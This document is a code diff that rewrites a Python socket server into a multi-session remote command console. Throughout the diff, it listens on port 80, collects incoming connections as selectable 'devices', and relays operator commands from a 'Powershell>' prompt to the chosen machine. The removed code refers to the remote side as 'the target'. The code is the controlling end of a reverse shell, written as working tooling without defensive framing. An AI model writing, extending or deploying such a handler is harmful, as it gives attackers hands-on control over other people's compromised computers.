@@ -5,53 +5,76 @@ from threading import Thread
 
 class Server():
     def __init__(self):
-        pass
+        self.clients = []
 
-    @staticmethod
-    def launch():
-        host, port = ('', 80)
+    def launch(self):
+        def listen():
+            host, port = ('', 80)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.bind((host,port))
+            self.s = s
+            while True:
+                s.listen(5)
+                print(f'Listening on port {port}...')
+                (client, address) = s.accept()
+                print(f'\nConnected: client address => {address[0]}')
+                self.clients.append((client, address))
+        self.th = Thread(target=listen)
+        self.th.start()
 
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind((host,port))
-        print('Socket initialized...')
-        s.listen(5)
-
+    def open_prompt(self, client):
+        print('Terminal open')
         while True:
-            (client, address) = s.accept()
-            print('client connected...')
-            print(f'Client address: {addr}')
-            msg = 'test'
+            cmd = input('Powershell>')
+            if cmd != "quit":
+                try:
+                    client.send(cmd.encode('utf-8'))
+                    ans = client.recv(1024).decode()
+                    print(ans)
+                except Exception as e:
+                    print('except on run_tcp_server: ', e)
+            else:
+                self.access_manager()
+                break
+
+
+    def access_manager(self):
+        def get_device():
+            print("Select current session to manage:")
+            print(str(len(self.clients)) + " devices. choose one")
+            select = input('>')
+            return select
+
+        def connect():
             try:
-                client.send(msg.encode('utf-8'))
-            except Exception as e:
-                print('except on run_tcp_server: ', e)
+                select = get_device()
+                select = int(select)
+                self.clients[select][0]
+                exist = True
+            except KeyboardInterrupt :
+                self.s.close()
+                sys.exit(1)
+            except:
+                exist = False
 
-            conn.close()
-            socket.close()
-
-
-    @staticmethod
-    def slaunch(port = 80):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind(('', port))
-        s.listen(1)
-        print("Listening on port " + str(port))
-        conn, addr = s.accept()
-        print('Connection received from ',addr)
-        while True:
-            #Receive data from the target and get user input
-            ans = conn.recv(1024).decode()
-            sys.stdout.write(ans)
-            command = input()
-
-            #Send command
-            command += "\n"
-            conn.send(command.encode())
-            time.sleep(1)
-
-            #Remove the output of the "input()" function
-            sys.stdout.write("\033[A" + ans.split("\n")[-1])
+            if exist:
+                self.open_prompt(self.clients[select][0])
+            else:
+                print('Element must exist...')
+                connect()
+        connect()
 
 
-server = Server()
-server.slaunch()
+def main():
+    try:
+        server = Server()
+        server.launch()
+        time.sleep(.1)
+        server.access_manager()
+    except Exception as e:
+        print(e)
+        server.s.close()
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
